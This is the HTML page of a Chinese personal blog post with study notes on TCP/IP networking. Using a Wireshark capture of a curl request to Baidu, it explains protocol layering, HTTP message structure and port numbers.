<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/144.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/145.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/146.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/147.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/148.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/149.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/150.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/151.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/152.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/153.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/154.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/155.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/156.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/157.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/158.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/159.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/160.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/161.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/162.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/163.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/164.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/165.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/166.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/167.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/168.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/169.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/170.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/171.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/172.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/173.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/174.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/175.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/176.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/177.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/178.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/179.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/180.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/181.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/182.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/184.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/185.jpg">
<meta property="article:published_time" content="2021-03-11T11:30:27.000Z">
<meta property="article:modified_time" content="2021-03-15T08:10:50.424Z">
<meta property="article:author" content="caciaCC">
<meta property="article:tag" content="计算机基础">
<meta property="article:tag" content="计算机基础-计算机网络知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/0.jpg">
  
    <link rel="alternative" href="/atom.xml" title="caciaCC的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="/assets/blogImg/touxiang.png">
  
  
    <link rel="apple-touch-icon" href="/apple-touch-icon-180x180.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.5a5b0a.css">
  <style type="text/css">
    
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

  
    
 	  <script src="/lib/clickLove.js"></script>
  
  


  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      


<div class="overlay" style="background: #90EE90;"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/assets/blogImg/touxiang.png" class="js-avatar">
		</a>
		<hgroup>
			<h1 class="header-author"><a href="/">caciaCC</a></h1>
		</hgroup>
		
		<p class="header-subtitle">just do it</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/" >主页</a></li>
			
				<li><a href="/tags/JAVA/" >JAVA</a></li>
			
				<li><a href="/tags/%E7%AE%97%E6%B3%95/" >算法</a></li>
			
				<li><a href="/tags/%E8%AE%B0%E5%BD%95/" >记录</a></li>
			
				<li><a href="/archives/" >全部</a></li>
			
			</ul>
		</nav>
		<nav class="header-smart-menu">
			
				
					<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章(tag)</a>
				
			
				
					<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">true</a>
				
			
				
			
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					
						<a class="leetcode" target="_blank" rel="noopener" href="https://leetcode-cn.com/u/cacia/" 
												title="力扣" ><i class="icon-leetcode"></i></a>
					
				
					
						<a class="github" target="_blank" rel="noopener" href="https://github.com/caciaCC" 
												title="GitHub" ><i class="icon-github"></i></a>
					
				
					
						<a class="gitee" target="_blank" rel="noopener" href="https://gitee.com/a1732583038" 
												title="码云" ><i class="icon-gitee"></i></a>
					
				
					
						<a class="zhihu" target="_blank" rel="noopener" href="https://www.zhihu.com/people/ccccc-40-47" 
												title="知乎" ><i class="icon-zhihu"></i></a>
					
				
					
						<a class="qq" target="_blank" rel="noopener" href="https://user.qzone.qq.com/1732583038?_t_=0.5998345024025399" 
												title="QQ" ><i class="icon-qq"></i></a>
					
				
					
						<a class="bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/13539525" 
												title="哔哩哔哩" ><i class="icon-bilibili"></i></a>
					
				
					
						<a class="mail" target="_blank" rel="noopener" href="https://1732583038@qq.com" 
												title="邮件联系" ><i class="icon-mail"></i></a>
					
				
			</div>
		
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #90EE90"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<a href="/">
					<img src="/assets/blogImg/touxiang.png" class="js-avatar">
				</a>
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">caciaCC</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>just do it<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						
						<a class="leetcode" target="_blank" 
							href="https://leetcode-cn.com/u/cacia/" title="力扣"><i class="icon-leetcode"></i></a>
						
					
						
						<a class="github" target="_blank" 
							href="https://github.com/caciaCC" title="GitHub"><i class="icon-github"></i></a>
						
					
						
						<a class="gitee" target="_blank" 
							href="https://gitee.com/a1732583038" title="码云"><i class="icon-gitee"></i></a>
						
					
						
						<a class="zhihu" target="_blank" 
							href="https://www.zhihu.com/people/ccccc-40-47" title="知乎"><i class="icon-zhihu"></i></a>
						
					
						
						<a class="qq" target="_blank" 
							href="https://user.qzone.qq.com/1732583038?_t_=0.5998345024025399" title="QQ"><i class="icon-qq"></i></a>
						
					
						
						<a class="bilibili" target="_blank" 
							href="https://space.bilibili.com/13539525" title="哔哩哔哩"><i class="icon-bilibili"></i></a>
						
					
						
						<a class="mail" target="_blank" 
							href="https://1732583038@qq.com" title="邮件联系"><i class="icon-mail"></i></a>
						
					
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 20%"><a href="/">主页</a></li>
		        
					<li style="width: 20%"><a href="/tags/JAVA/">JAVA</a></li>
		        
					<li style="width: 20%"><a href="/tags/%E7%AE%97%E6%B3%95/">算法</a></li>
		        
					<li style="width: 20%"><a href="/tags/%E8%AE%B0%E5%BD%95/">记录</a></li>
		        
					<li style="width: 20%"><a href="/archives/">全部</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1"
              class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            <article id="post-计算机基础-深入理解TCP协议-从原理到实战-学习" class="article article-type-post " itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 class="article-title" itemprop="name">
      计算机基础-深入理解TCP协议:从原理到实战-学习
    </h1>
  


  
  
<a href="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
        <time datetime="2021-03-11T11:30:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
</a>

  
  
    
<div style="margin-top:10px;">
  <span class="post-time">
    <span class="post-meta-item-icon">
      <!-- fonts.scss -->
      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
      <i class="icon-statistics"></i>
      <span class="post-meta-item-text"> 字数统计:</span>
      <span class="post-count">50.6k字</span>
    </span>
  </span>

  <span class="post-time">
    &nbsp; | &nbsp;
    <span class="post-meta-item-icon">
      <i class="icon-book icon"></i>
      <span class="post-meta-item-text"> 阅读时长≈</span>
      <span class="post-count">198分</span>
    </span>
  </span>
</div>


  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <h3 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h3><p><a target="_blank" rel="noopener" href="https://juejin.cn/book/6844733788681928712">深入理解 TCP 协议：从原理到实战</a></p>
<h2 id="2-历史与分层模型"><a href="#2-历史与分层模型" class="headerlink" title="2 历史与分层模型"></a>2 历史与分层模型</h2><h3 id="TCP-IP-网络分层"><a href="#TCP-IP-网络分层" class="headerlink" title="TCP/IP 网络分层"></a>TCP/IP 网络分层</h3><p>用 wireshark 抓包的方式来开始看网络分层。</p>
<p>打开 wireshark，在弹出的选项中，选中 en0 网卡，在过滤器中输入host <code>www.baidu.com</code>，只抓取与百度服务器通信的数据包。</p>
<p>在命令行中用 curl 命令发起 http 请求：<code>curl http://www.baidu.com</code>，抓到的中间一次数据包。</p>
<p>[图片]</p>
<p>可以看到协议的分层从上往下依次是</p>
<p><code>Ethernet II</code>：网络接口层以太网帧头部信息<br><code>Internet Protocol Version 4</code>：互联网层 IP 包头部信息<br><code>Transmission Control Protocol</code>：传输层的数据段头部信息，此处是 TCP 协议<br><code>Hypertext Transfer Protocol</code>：应用层 HTTP 的信息</p>
<a id="more"></a>

<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/0.jpg"></p>
<h4 id="应用层（Application-Layer）"><a href="#应用层（Application-Layer）" class="headerlink" title="应用层（Application Layer）"></a>应用层（Application Layer）</h4><p>应用层的本质是规定了应用程序之间如何相互传递报文， 以 HTTP 协议为例，它规定了</p>
<p>1.报文的类型，是请求报文还是响应报文</p>
<p>2.报文的语法，报文分为几段，各段是什么含义、用什么分隔，每个部分的每个字段什么什么含义</p>
<p>3.进程应该以什么样的时序发送报文和处理响应报文</p>
<p>HTTP 客户端和 HTTP 服务端的首要工作就是根据 HTTP 协议的标准组装和解析 HTTP 数据包，每个 HTTP 报文格式由三部分组成：</p>
<p>1.起始行（start line），起始行根据是请求报文还是响应报文分为「请求行」和「响应行」。这个例子中起始行是<code>GET / HTTP/1.1</code>，表示这是一个<code> GET</code> 请求，请求的 URL 为<code>/</code>，协议版本为<code>HTTP 1.1</code>，起始行最后会有一个空行<code>CRLF（\r\n)</code>与下面的首部分隔开</p>
<p>2.首部（header），首部采用形如<code>key:value</code>的方式，比如常见的<code>User-Agent</code>、<code>ETag</code>、<code>Content-Length</code>都属于 HTTP 首部，每个首部直接也是用空行分隔</p>
<p>3.可选的实体（entity），实体是 HTTP 真正要传输的内容，比如下载一个图片文件，传输的一段 HTML等</p>
<p>以本例的请求报文格式为例</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/1.jpg"></p>
<p>除了我们熟知的 HTTP 协议，还有下面这些非常常用的应用层协议</p>
<p>1.域名解析协议 DNS</p>
<p>2.收发邮件 SMTP 和 POP3 协议</p>
<p>3.时钟同步协议 NTP</p>
<p>4.网络文件共享协议 NFS</p>
<h4 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h4><p>传输层的作用是为两台主机之间的「应用进程」提供端到端的逻辑通信，相隔几千公里的两台主机的进程就好像在直接通信一样。</p>
<p>虽然是叫传输层，但是并不是将数据包从一台主机传送到另一台，而是对「传输行为进行控制」，这本小册介绍的主要内容 TCP 协议就被称为传输控制协议（Transmission Control Protocol），为下面两层协议提供数据包的重传、流量控制、拥塞控制等。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/2.jpg"></p>
<p>假设你正在电脑上用微信跟女朋友聊天，用 QQ 跟技术大佬们讨论技术细节，当电脑收到一个数据包时，它怎么知道这是一条微信的聊天内容，还是一条 QQ 的消息呢？</p>
<p>这就是端口号的作用。传输层用端口号来标识不同的应用程序，主机收到数据包以后根据目标端口号将数据包传递给对应的应用程序进行处理。比如这个例子中，目标端口号为 80，百度的服务器就根据这个目标端口号将请求交给<code>监听 80 端口</code>的应用程序（可能是 Nginx 等负载均衡器）处理</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/3.jpg"></p>
<h4 id="网络互连层（Internet-Layer）"><a href="#网络互连层（Internet-Layer）" class="headerlink" title="网络互连层（Internet Layer）"></a>网络互连层（Internet Layer）</h4><p>网络互连层提供了主机到主机的通信，将传输层产生的的数据包封装成<code>分组数据包</code>发送到目标主机，并提供<code>路由选择</code>的能力</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/4.jpg"></p>
